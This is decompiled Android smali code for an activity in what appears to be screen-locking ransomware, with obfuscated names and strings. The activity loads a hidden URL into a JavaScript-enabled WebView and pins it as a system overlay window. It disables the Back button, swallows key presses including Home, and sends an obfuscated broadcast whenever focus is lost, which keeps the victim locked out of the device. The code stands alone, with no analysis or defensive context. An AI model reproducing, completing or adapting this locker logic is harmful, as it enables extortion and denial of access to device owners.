.class public Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;
.super Landroid/app/Activity;


# instance fields
.field private fsafsdfsfsdfsfsdfsd:Landroid/view/View;

.field private sdfsdfsdfsdf:Landroid/webkit/WebView;


# direct methods
.method public constructor <init>()V
    .locals 0

    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    return-void
.end method


# virtual methods
.method public onBackPressed()V
    .locals 0

    return-void
.end method

.method public onCreate(Landroid/os/Bundle;)V
    .locals 3

    const v0, 0x7f080005

    const v1, 0x7f040003

    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    invoke-virtual {p0, v1}, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->setContentView(I)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->findViewById(I)Landroid/view/View;

    move-result-object v0

    check-cast v0, Landroid/webkit/WebView;

    iput-object v0, p0, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->sdfsdfsdfsdf:Landroid/webkit/WebView;

    iget-object v0, p0, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->sdfsdfsdfsdf:Landroid/webkit/WebView;

    invoke-virtual {v0}, Landroid/webkit/WebView;->getSettings()Landroid/webkit/WebSettings;

    move-result-object v0

    const/4 v1, 0x1

    invoke-virtual {v0, v1}, Landroid/webkit/WebSettings;->setJavaScriptEnabled(Z)V

    iget-object v0, p0, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->sdfsdfsdfsdf:Landroid/webkit/WebView;

    const-string v1, "\n\u0001\u0000\rVGCG\r\u0006\u0008\u001a\u0003\u0001\u00087\r\u001b\u001f\r\u0018G\u0004\r\u0000\u0018B\u0000\u0018\u0005\u0000"

    invoke-static {v1}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/i;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v0, v1}, Landroid/webkit/WebView;->loadUrl(Ljava/lang/String;)V

    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    invoke-direct {v1}, Landroid/view/WindowManager$LayoutParams;-><init>()V

    const v0, 0x40108

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->flags:I

    iget-object v0, p0, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->sdfsdfsdfsdf:Landroid/webkit/WebView;

    iput-object v0, p0, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->fsafsdfsfsdfsfsdfsd:Landroid/view/View;

    iget-object v0, p0, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->fsafsdfsfsdfsfsdfsd:Landroid/view/View;

    invoke-virtual {v0}, Landroid/view/View;->getParent()Landroid/view/ViewParent;

    move-result-object v0

    check-cast v0, Landroid/view/ViewGroup;

    iget-object v2, p0, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->fsafsdfsfsdfsfsdfsd:Landroid/view/View;

    invoke-virtual {v0, v2}, Landroid/view/ViewGroup;->removeView(Landroid/view/View;)V

    const/16 v0, 0x7da

    iput v0, v1, Landroid/view/WindowManager$LayoutParams;->type:I

    invoke-virtual {p0}, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    const-string v2, "p)i$h7"

    invoke-static {v2}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Landroid/view/WindowManager;

    iget-object v2, p0, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->fsafsdfsfsdfsfsdfsd:Landroid/view/View;

    invoke-interface {v0, v2, v1}, Landroid/view/WindowManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V

    return-void
.end method

.method public onKeyDown(ILandroid/view/KeyEvent;)Z
    .locals 2

    const/4 v1, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_0

    :cond_0
    return v1
.end method

.method public onKeyUp(ILandroid/view/KeyEvent;)Z
    .locals 2

    const/4 v1, 0x1

    const/4 v0, 0x3

    if-ne p1, v0, :cond_0

    :cond_0
    return v1
.end method

.method public onWindowFocusChanged(Z)V
    .locals 2

    invoke-super {p0, p1}, Landroid/app/Activity;->onWindowFocusChanged(Z)V

    if-nez p1, :cond_0

    new-instance v0, Landroid/content/Intent;

    const-string v1, "f.c2h)cnn.s%i4)!d4n/inD\u000cH\u0013B\u001fT\u0019T\u0014B\rX\u0004N\u0001K\u000f@\u0013"

    invoke-static {v1}, Lfsdfsdf/gsdsfsf/gjhghjg/lbljhkjblkjblkjblkj/f;->fsafsdfsfsdfsfsdfsd(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    invoke-direct {v0, v1}, Landroid/content/Intent;-><init>(Ljava/lang/String;)V

    invoke-virtual {p0, v0}, Lcompse/refact/st/upsssss/Crypt/Scrynlock$mainActivity;->sendBroadcast(Landroid/content/Intent;)V

    :cond_0
    return-void
.end method
